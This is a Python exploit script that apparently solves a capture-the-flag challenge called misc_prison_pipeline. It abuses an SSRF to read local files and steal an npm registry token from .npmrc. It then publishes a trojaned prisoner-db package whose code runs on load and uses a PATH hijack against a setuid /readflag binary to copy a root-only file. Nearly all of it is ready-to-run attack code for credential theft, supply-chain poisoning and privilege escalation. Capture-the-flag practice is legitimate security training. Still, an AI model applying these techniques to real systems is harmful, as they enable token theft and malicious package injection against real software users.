#!/usr/bin/env python3
"""
End-to-end exploit for misc_prison_pipeline (only run against challenge instances you are authorized to test).

Steps:
  0. Check connectivity to the target.
  1. Verify SSRF: internal service (127.0.0.1:5000), file:///etc/passwd, file:///root/flag (expected to be blocked).
  2. Read the registry token from file:///home/node/.npmrc and validate it with /-/whoami (read-only).
  3. Publish a prisoner-db package with a payload through the registry vhost.
  4. Wait for the npm update + pm2 restart cronjob to load the payload, which runs /readflag with a PATH hijack.
  5. Read the flag through SSRF at file:///tmp/flag_out.

Usage:
  python3 solve.py <target_ip> <target_port> [--version 1.0.3]
"""
import argparse
import base64
import hashlib
import io
import json
import os
import re
import sys
import tarfile
import time

import requests

HOST_HEADER = "registry.prison-pipeline.htb"
PKG = "prisoner-db"
PAYLOAD_DIR = "/tmp/pwn"
FLAG_OUT = "/tmp/flag_out"
DEPS = {"js-yaml": "^4.1.0", "node-libcurl": "4.0.0"}

# Challenge source is kept outside the public repo, in <repo>/private/ (gitignored).
HERE = os.path.dirname(os.path.abspath(__file__))
PRIVATE_DIR = os.path.join(HERE, "..", "..", "..", "..", "..", "private", "htb", "try-out", "misc_prison_pipeline")
ORIGINAL_INDEX = os.path.join(PRIVATE_DIR, "challenge", "prisoner-db", "index.js")
# index.js does require('./curl'), so the tarball must include this file too; without it the app crashes on load.
ORIGINAL_CURL = os.path.join(os.path.dirname(ORIGINAL_INDEX), "curl.js")

# Runs when the module is required. Writes a fake `cat`, then calls /readflag with PATH pointing at it.
# /readflag is setuid root, so the fake cat runs with euid 0 and can copy /root/flag.
PAYLOAD = """
try {
  const fs = require('fs');
  const { execSync } = require('child_process');
  fs.mkdirSync('__PAYLOAD_DIR__', { recursive: true });
  fs.writeFileSync('__PAYLOAD_DIR__/cat', '#!/bin/sh\\ncp /root/flag __FLAG_OUT__ && chmod 644 __FLAG_OUT__\\n');
  fs.chmodSync('__PAYLOAD_DIR__/cat', 0o755);
  execSync('PATH=__PAYLOAD_DIR__:$PATH /readflag', { stdio: 'ignore', timeout: 10000 });
} catch (e) {}
"""


def log(step, msg=""):
    print(f"[{step}] {msg}")


def ssrf_read(base, url):
    """Import a URL through the SSRF, then read the stored content back. Returns None if the server could not read it."""
    r = requests.post(f"{base}/api/prisoners/import", json={"url": url}, timeout=20)
    pid = r.json().get("prisoner_id")
    if not pid:
        return None
    return requests.get(f"{base}/api/prisoners/{pid}", timeout=20).json().get("raw")


def check_connectivity(base):
    r = requests.get(base, timeout=15)
    if r.status_code != 200:
        raise RuntimeError(f"home page returned {r.status_code}")
    api = requests.get(f"{base}/api/prisoners", timeout=15)
    if api.status_code != 200:
        raise RuntimeError(f"/api/prisoners returned {api.status_code}")
    log("0", f"connected, /api/prisoners returned {len(api.json())} records")


def verify_ssrf(base):
    """Check the SSRF against internal targets and file:// URLs. Returns True if the SSRF works."""
    checks = [
        ("internal http://127.0.0.1:5000/api/prisoners", "http://127.0.0.1:5000/api/prisoners", "PIP-"),
        ("file:///etc/passwd", "file:///etc/passwd", "root:x:0:0"),
        ("file:///root/flag (expected to be blocked)", "file:///root/flag", None),
    ]
    ok = True
    for label, url, marker in checks:
        raw = ssrf_read(base, url)
        if marker is None:
            status = "blocked (as expected)" if raw is None else f"READABLE: {raw[:60]!r}"
            log("1", f"{label}: {status}")
            continue
        found = raw is not None and marker in raw
        ok = ok and found
        log("1", f"{label}: {'OK' if found else 'FAILED'}")
    return ok


def get_token(base):
    npmrc = ssrf_read(base, "file:///home/node/.npmrc")
    if not npmrc:
        raise RuntimeError("could not read /home/node/.npmrc")
    m = re.search(r'_authToken="?([^"\s]+)"?', npmrc)
    if not m:
        raise RuntimeError("no _authToken found in .npmrc")
    return m.group(1)


def check_token(base, token):
    r = requests.get(
        f"{base}/-/whoami",
        headers={"Host": HOST_HEADER, "Authorization": f"Bearer {token}"},
        timeout=15,
    )
    if r.status_code == 200:
        return r.json().get("username")
    return None


def build_tarball(version, payload_js, original_js):
    pkg_json = {"name": PKG, "version": version, "main": "index.js", "dependencies": DEPS}
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in (
            ("package/package.json", json.dumps(pkg_json, indent=2).encode()),
            ("package/index.js", (payload_js + "\n" + original_js).encode()),
            ("package/curl.js", open(ORIGINAL_CURL, "rb").read()),
        ):
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def publish(base, token, version, tgz):
    tarname = f"{PKG}-{version}.tgz"
    manifest = {
        "name": PKG,
        "version": version,
        "main": "index.js",
        "dependencies": DEPS,
        "dist": {
            "shasum": hashlib.sha1(tgz).hexdigest(),
            "integrity": "sha512-" + base64.b64encode(hashlib.sha512(tgz).digest()).decode(),
            # Verdaccio cannot read the packument without a tarball URL (it returns 500 unknown error)
            "tarball": f"http://{HOST_HEADER}/{PKG}/-/{tarname}",
        },
    }
    doc = {
        "_id": PKG,
        "name": PKG,
        "dist-tags": {"latest": version},
        "versions": {version: manifest},
        "_attachments": {
            tarname: {
                "content_type": "application/octet-stream",
                "data": base64.b64encode(tgz).decode(),
                "length": len(tgz),
            }
        },
    }
    r = requests.put(
        f"{base}/{PKG}",
        json=doc,
        headers={"Host": HOST_HEADER, "Authorization": f"Bearer {token}"},
        timeout=30,
    )
    return r.status_code, r.text[:200]


def wait_for_flag(base, attempts, interval):
    for i in range(attempts):
        time.sleep(interval)
        raw = ssrf_read(base, f"file://{FLAG_OUT}")
        if raw:
            return raw
        log("4", f"no flag yet, retrying ({i + 1}/{attempts})")
    return None


def main():
    parser = argparse.ArgumentParser(description="E2E exploit for misc_prison_pipeline")
    parser.add_argument("target_ip", help="target IP address or hostname")
    parser.add_argument("target_port", type=int, help="target port")
    parser.add_argument("--version", default="1.0.2", help="prisoner-db version to publish")
    parser.add_argument("--src", default=ORIGINAL_INDEX, help="original prisoner-db index.js")
    parser.add_argument("--attempts", type=int, default=12)
    parser.add_argument("--interval", type=int, default=30)
    args = parser.parse_args()

    base = f"http://{args.target_ip}:{args.target_port}"
    log("target", base)

    try:
        check_connectivity(base)
    except Exception as e:
        log("0", f"cannot connect: {e}")
        return 1

    if not verify_ssrf(base):
        log("1", "SSRF did not behave as expected, stopping.")
        return 1
    log("1", "SSRF confirmed: can read internal services and local files")

    token = get_token(base)
    user = check_token(base, token)
    if not user:
        log("2", "token was read but whoami did not confirm it, stopping.")
        return 1
    log("2", f"token valid, registry user: {user}")

    with open(args.src) as f:
        original_js = f.read()
    payload = PAYLOAD.replace("__PAYLOAD_DIR__", PAYLOAD_DIR).replace("__FLAG_OUT__", FLAG_OUT)
    tgz = build_tarball(args.version, payload, original_js)

    status, body = publish(base, token, args.version, tgz)
    if status not in (200, 201):
        log("3", f"publish {PKG}@{args.version} failed: HTTP {status} {body}")
        log("3", "stopping. The registry may have a storage error; check the server side.")
        return 1
    log("3", f"published {PKG}@{args.version}")

    log("4", "waiting for the npm update + pm2 restart cronjob to load the payload")
    flag = wait_for_flag(base, args.attempts, args.interval)
    if flag is None:
        log("4", "could not retrieve the flag. Check the cronjob and npm update on the server.")
        return 1

    log("5", "flag:")
    print(flag.strip())
    return 0


if __name__ == "__main__":
    sys.exit(main())
